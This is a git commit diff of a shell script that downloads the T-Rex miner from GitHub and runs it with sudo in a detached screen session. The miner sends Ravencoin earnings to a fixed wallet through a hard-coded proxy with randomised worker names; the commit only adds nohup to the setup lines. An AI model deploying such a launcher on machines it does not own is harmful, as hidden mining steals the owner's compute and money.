66bd6e6f2f514fb649533ffc7b2ed79acb722f81
denisule54 <87700595+denisule54@users.noreply.github.com>
2022-01-20 11:30:49 +0700

    Update Trex.sh

--- Trex.sh
+++ Trex.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
-apt-get update
-apt install screen -y
-apt-get install libpci3
-wget https://github.com/trexminer/T-Rex/releases/download/0.24.8/t-rex-0.24.8-linux.tar.gz
-tar xf t-rex-0.24.8-linux.tar.gz
+nohup apt-get update
+nohup apt install screen -y
+nohup apt-get install libpci3
+nohup wget https://github.com/trexminer/T-Rex/releases/download/0.24.8/t-rex-0.24.8-linux.tar.gz
+nohup tar xf t-rex-0.24.8-linux.tar.gz
 screen -d -m sudo ./t-rex -a kawpow -o stratum+tcp://rvn-eu.minerpool.org:16059 -u RBXC64GiFJYcYMnfHV5XjTELsHEEQxivmZ.$(echo $(shuf -i 1-99 -n 1)-RVX) -p x3 --proxy 209.127.191.180:9279
